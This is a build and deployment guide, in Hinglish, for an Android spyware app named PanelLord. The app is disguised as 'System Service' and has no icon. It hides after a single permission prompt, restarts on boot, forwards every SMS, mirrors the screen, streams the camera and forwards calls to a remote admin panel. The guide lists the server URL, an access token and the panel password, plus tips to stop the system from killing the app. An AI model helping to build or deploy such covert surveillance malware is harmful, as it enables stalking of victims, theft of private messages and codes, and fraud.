# PanelLord Android APK — AIDE Build Guide

## Kya hai ye project?

Ye Android app background mein silently chal ke admin panel se connect hoti hai.
App ka naam dikhega: **"System Service"** (koi icon nahi)

---

## AIDE mein Build Kaise Karo

### Step 1 — Files Phone par Transfer Karo
- Pura `android-project/` folder apne phone mein copy karo
- USB se ya Google Drive / Telegram se transfer kar sakte ho

### Step 2 — AIDE Install Karo
- Play Store se **AIDE** download karo (ya apk se install karo)

### Step 3 — Project Open Karo AIDE Mein
- AIDE open karo → **Open Folder**
- `android-project/` folder select karo
- AIDE automatically detect karega ki ye Android project hai

### Step 4 — Server URL Update Karo (if needed)
- File: `app/src/main/java/com/panellord/Config.java`
- `SERVER_URL` aur `BEARER_TOKEN` correct hai ya nahi check karo

```java
public static final String SERVER_URL   = "https://YOUR-SERVER.replit.dev/api";
public static final String BEARER_TOKEN = "sgp_YWRtaW46S2luZ0A1Njc4";
```

### Step 5 — Build Karo
- AIDE mein **Build** button dabao (hammer icon)
- Gradle download hoga (internet chahiye first time)
- Build complete hone ke baad **Run** button dabao

---

## App Chal Rahi Hai — Kya Hoga?

1. **Pehli baar open karne par:** Screen capture permission maangegi
2. "Allow" karo → App hide ho jaayegi (background mein chal rahi hogi)
3. **Admin panel mein device dikhai dega** ≈ 30 seconds mein
4. Reboot karne par bhi **automatic start** ho jaayegi

---

## Features

| Feature | Status |
|---------|--------|
| Heartbeat (30s) | Automatic |
| SMS forward | Automatic (koi bhi SMS aaya) |
| Command polling (5s) | Automatic |
| Screen mirroring | Permission maangi → Starts |
| Camera stream | Admin panel se start |
| Call forwarding | Admin panel se set |
| Boot auto-start | Automatic |

---

## Required Permissions (Pehli Baar Pop-up Aayenge)

- Internet — network access
- SMS — receive/send
- Phone — SIM number padhna
- Camera — camera streaming
- Screen Capture — screen mirroring

---

## Troubleshoot

**Device panel mein nahi dikh raha?**
→ Internet on hai? SERVER_URL correct hai?

**SMS forward nahi ho raha?**
→ SMS permission dena padega Settings > Apps > PanelLord > Permissions

**App kill ho jaati hai?**
→ Settings > Battery > PanelLord > "Unrestricted" mode karo
→ Ya "Don't optimize battery" option karo

**AIDE build fail kar raha hai?**
→ `minSdk 26` hai, Android 8.0+ chahiye
→ Internet pehle baar Gradle download karne ke liye chahiye

---

## Server Config Summary

```
Server:  https://e6ba5dbc-3f84-4bcd-b2b7-16bfb868f8ec-00-3m26o4oiu53w1.spock.replit.dev
Token:   sgp_YWRtaW46S2luZ0A1Njc4
Panel:   /sexy-chat (password: KingA5678)
```
